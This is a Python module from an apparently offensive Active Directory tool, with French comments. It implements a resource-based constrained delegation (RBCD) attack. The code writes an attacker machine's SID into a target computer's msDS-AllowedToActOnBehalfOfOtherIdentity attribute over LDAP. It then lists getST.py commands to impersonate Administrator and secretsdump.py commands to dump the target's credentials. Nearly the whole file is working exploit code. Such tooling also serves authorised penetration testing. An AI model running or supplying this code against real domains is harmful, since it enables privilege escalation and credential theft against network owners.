# strategies/allowedToActStrategy.py
import logging
from impacket.ldap.ldaptypes import (
    SR_SECURITY_DESCRIPTOR, LDAP_SID,
    ACCESS_ALLOWED_ACE, ACL, ACCESS_MASK
)
from ldap3 import MODIFY_REPLACE, MODIFY_ADD
from rich.prompt import result

from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind

logger = logging.getLogger(__name__)


class AllowedToActStrategy:
    """
    Exploite la permission AllowedToAct (RBCD) sur un objet AD.

    Principe :
        L'attribut 'msDS-AllowedToActOnBehalfOfOtherIdentity' d'un objet
        machine contient un Security Descriptor. Si on peut écrire cet
        attribut sur la machine cible, on peut y ajouter n'importe quel
        compte machine comme délégué → S4U2Proxy → usurpation d'identité.

    Chaîne d'attaque :
        AllowedToAct → écrire msDS-AllowedToActOnBehalfOfOtherIdentity
                     → S4U2Self + S4U2Proxy
                     → ticket de service en tant qu'Administrator
    """

    def __init__(self, client_entity):
        self.client = client_entity

    # ------------------------------------------------------------------ #
    #  Point d'entrée principal                                           #
    # ------------------------------------------------------------------ #

    def exploit(self, edge: Edge, attacker_sid: str, target_dn: str) -> ExploitResult:
        """
        :param edge:         Edge BloodHound (AllowedToAct)
        :param attacker_sid: SID du compte machine contrôlé par l'attaquant
                             (doit être un compte machine, ex: ATTACKERMACHINE$)
        :param target_dn:    DN LDAP réel de la machine cible
        """
        if edge.kind != EdgeKind.ALLOWED_TO_ACT:
            return ExploitResult(
                technique="AllowedToAct",
                edge=edge,
                success=False,
                notes=f"Edge invalide : attendu ALLOWED_TO_ACT, reçu {edge.kind}"
            )

        logger.info(f"[AllowedToAct] {edge.source_node.label} → {edge.goal_node.label}")

        try:
            # 1. Construire le Security Descriptor contenant le SID attaquant
            sd_bytes = self._build_rbcd_sd(attacker_sid)

            # 2. Écrire l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity
            self._write_rbcd(target_dn, sd_bytes)

            logger.info(f"[AllowedToAct] ✅ RBCD configuré sur {edge.goal_node.label}")

            return ExploitResult(
                technique="AllowedToAct",
                edge=edge,
                success=True,
                notes=(
                    f"msDS-AllowedToActOnBehalfOfOtherIdentity écrit sur "
                    f"'{edge.goal_node.label}' pour SID '{attacker_sid}'"
                ),
                next_steps=[
                    f"getST.py -spn cifs/{edge.goal_node.label.split('@')[0]} "
                    f"-impersonate Administrator "
                    f"-dc-ip <DC_IP> <DOMAIN>/<ATTACKER_MACHINE>$:<PASSWORD>",
                    "export KRB5CCNAME=Administrator.ccache",
                    f"secretsdump.py -k -no-pass <DOMAIN>/Administrator@{edge.goal_node.label.split('@')[0]}"
                ]
            )

        except PermissionError as e:
            return self._fail(edge, f"Droits insuffisants : {e}")
        except Exception as e:
            logger.exception("[AllowedToAct] Erreur inattendue")
            return self._fail(edge, str(e))

    # ------------------------------------------------------------------ #
    #  Helpers privés                                                     #
    # ------------------------------------------------------------------ #

    def _build_rbcd_sd(self, attacker_sid: str) -> bytes:
        """
        Construit un Security Descriptor minimal contenant un ACE
        qui autorise attacker_sid à déléguer vers la machine cible.

        Structure du SD :
          Header(20) + DACL(8 + ACE) + [pas de Owner/Group nécessaire]

        L'ACE donne le droit 0x000f01ff (FullControl) au compte attaquant,
        ce qui est suffisant pour que le DC accepte la délégation S4U2Proxy.
        """
        # ── Construire le SID de l'attaquant ──────────────────────────
        sid = LDAP_SID()
        sid.fromCanonical(attacker_sid)
        sid_bytes = sid.getData()

        # ── Construire l'ACE ACCESS_ALLOWED ───────────────────────────
        # Masque : 0x000f01ff = ADS_RIGHT_GENERIC_ALL pour objets machine
        ace_mask = 0x000f01ff
        ace_size = 4 + 4 + len(sid_bytes)   # header(4) + mask(4) + sid

        import struct
        ace_bytes  = struct.pack("<BBH", 0x00, 0x00, ace_size)  # Type, Flags, Size
        ace_bytes += struct.pack("<I", ace_mask)                  # AccessMask
        ace_bytes += sid_bytes                                     # SID

        # ── Construire la DACL ────────────────────────────────────────
        # AclRevision=2, Sbz1=0, AclSize=8+ace, AceCount=1, Sbz2=0
        dacl_size  = 8 + len(ace_bytes)
        dacl_bytes = struct.pack("<BBHHH", 2, 0, dacl_size, 1, 0)
        dacl_bytes += ace_bytes

        # ── Construire le Security Descriptor minimal ─────────────────
        # Pour msDS-AllowedToActOnBehalfOfOtherIdentity, l'AD accepte
        # un SD sans Owner/Group (contrairement à nTSecurityDescriptor)
        # Control : SE_SELF_RELATIVE(0x8000) | SE_DACL_PRESENT(0x0004)
        control  = 0x8004
        off_dacl = 20   # juste après le header de 20 octets

        sd_bytes = struct.pack("<BBHIIII",
            1,          # Revision
            0,          # Sbz1
            control,    # Control
            0,          # OffsetOwner = 0 (absent)
            0,          # OffsetGroup = 0 (absent)
            0,          # OffsetSacl  = 0 (absent)
            off_dacl,   # OffsetDacl
        )
        sd_bytes += dacl_bytes

        logger.debug(f"[AllowedToAct] SD RBCD construit : {len(sd_bytes)} octets")
        return sd_bytes

    def _write_rbcd(self, target_dn: str, sd_bytes: bytes) -> None:
        """
        Écrit le SD dans msDS-AllowedToActOnBehalfOfOtherIdentity.
    
        Comportement :
        - Si l'attribut est VIDE   → on crée le SD avec notre ACE seul
        - Si l'attribut EXISTE     → on lit le SD existant, on y ajoute
                                  notre ACE sans écraser les ACEs légitimes
        """
        import struct
        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID

        conn = self.client.ldap_connection

        # ── 1. Lire l'attribut existant ───────────────────────────────────
        conn.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity"]
        )
        if not conn.entries:
            raise ValueError(f"Objet introuvable : {target_dn}")

        existing_raw = conn.entries[0][
            "msDS-AllowedToActOnBehalfOfOtherIdentity"
        ].raw_values

        if existing_raw:
            # ── 2a. Attribut existant → merger notre ACE dans la DACL ─────
            logger.debug("[AllowedToAct] Attribut existant — fusion de l'ACE")

            existing_sd = bytes(existing_raw[0])

            # Lire les offsets du SD existant
            off_own  = struct.unpack_from("<I", existing_sd, 4)[0]
            off_grp  = struct.unpack_from("<I", existing_sd, 8)[0]
            off_sacl = struct.unpack_from("<I", existing_sd, 12)[0]
            off_dacl = struct.unpack_from("<I", existing_sd, 16)[0]

            # Vérifier que notre SID n'est pas déjà présent
            # (idempotence : évite les doublons si on relance l'exploit)
            if sd_bytes[20 + 8 + 4:] in existing_sd:
                logger.info("[AllowedToAct] SID déjà présent dans la DACL — skip")
                return

            # Extraire notre ACE depuis le SD qu'on a construit
            # (notre SD minimal : header(20) + dacl_header(8) + ace)
            our_ace_bytes = sd_bytes[20 + 8:]   # après header SD + header DACL

            # Extraire les ACEs existants et le suffix Owner/Group
            if off_own > 0:
                # SD avec Owner/Group
                existing_aces = existing_sd[off_dacl + 8 : off_own]
                suffix        = existing_sd[off_own:]
            else:
                # SD sans Owner/Group (cas msDS-AllowedToActOnBehalfOfOtherIdentity)
                existing_aces = existing_sd[off_dacl + 8:]
                suffix        = b""

            old_ace_count = struct.unpack_from("<H", existing_sd, off_dacl + 4)[0]
            old_acl_rev   = existing_sd[off_dacl]

            # Reconstruire la DACL avec notre ACE en tête
            new_aces      = our_ace_bytes + existing_aces
            new_ace_count = old_ace_count + 1
            new_acl_size  = 8 + len(new_aces)
            new_dacl      = struct.pack("<BBHHH", old_acl_rev, 0, new_acl_size, new_ace_count, 0)
            new_dacl      += new_aces

            delta = len(new_dacl) - (
                (off_own if off_own > 0 else len(existing_sd)) - off_dacl
            )

            # Assembler le nouveau SD en patchant in-place (préserve le Control word)
            new_body = existing_sd[:off_dacl] + new_dacl + suffix
            new_sd   = bytearray(new_body)

            if off_own > 0:
                struct.pack_into("<I", new_sd, 4,  off_own  + delta)
            if off_grp > 0:
                struct.pack_into("<I", new_sd, 8,  off_grp  + delta)
            if off_sacl > 0:
                struct.pack_into("<I", new_sd, 12, off_sacl + delta)

            final_sd = bytes(new_sd)
            logger.debug(
                f"[AllowedToAct] SD fusionné : {len(final_sd)} octets, "
                f"AceCount={new_ace_count}"
            )

        else:
            # ── 2b. Attribut absent → utiliser notre SD minimal directement ─
            logger.debug("[AllowedToAct] Attribut absent — création")
            final_sd = sd_bytes

        # ── 3. Écriture ───────────────────────────────────────────────────
        result = conn.modify(
            dn=target_dn,
            changes={
                "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                    (MODIFY_REPLACE, [final_sd])   # REPLACE car on a déjà mergé manuellement
                ]
            }
        )

        logger.debug(f"[AllowedToAct] LDAP result : {conn.result}")

        if not result:
            desc = conn.result.get("description", "?")
            msg  = conn.result.get("message", "")
            raise PermissionError(f"{desc} | {msg}")